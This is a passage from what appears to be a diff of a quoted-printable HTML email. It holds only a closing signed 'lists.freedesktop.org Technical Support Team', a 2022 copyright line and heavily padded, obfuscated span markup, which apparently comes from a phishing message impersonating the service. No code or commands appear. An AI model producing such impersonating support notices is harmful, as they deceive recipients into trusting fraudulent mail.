+oration-style: initial; text-decoration-color: initial; -webkit-text-stroke=
+-width: 0px; text-decoration-thickness: initial">
+Regards,<BR style=3D"BOX-SIZING: border-box">
+<SPAN style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto=
+, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(29,34,40); FONT-STYLE: normal; TEXT-ALIGN: le=
+ft; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-v=
+ariant-ligatures: normal; font-variant-caps: normal; text-decoration-style:=
+ initial; text-decoration-color: initial; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial">
+<FONT color=3D#000000 size=3D3 face=3D"Times New Roman">lists.freedesktop.o=
+rg</FONT></SPAN> Technical Support Team<BR style=3D"BOX-SIZING: border-box"=
+>
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">Copyright </SPAN><=
+/SPAN>
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D'BOX-SIZING: border-box; FONT-FAMILY: "new =
+times", serif; COLOR: rgb(0,0,0)'>
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">
+<SPAN=20
+id=3D"v1v1m_-4073586707394668194gmail-m_2816630307823458481m_-1081998537428=
+781577m_6841360037700439274m_620196009487560908m_1721293047556138143m_72711=
+65664184472303m_-3588157470962885146m_3528938847357552438m_-364366898028411=
+021m_3386240612496612157m_-484185717131438651m_-2667230418373408975m_176067=
+0833373304784m_3801889082888807496m_2075038924029565206m_-41255711507132513=
+44m_6730663347181104419m_6980724882504985148m_409812059450197905m_295661730=
+8627788765m_3055049698645614911m_-641751757379890753
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;=
+&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;&#13;&#10;=
+0m&#10;&#10;&#10;v1_63" style=3D"BOX-SIZING: border-box">&copy; 2022&nbsp;<=
+/SPAN></SPAN></SPAN></SPAN></SPAN></P></BODY></HTML>
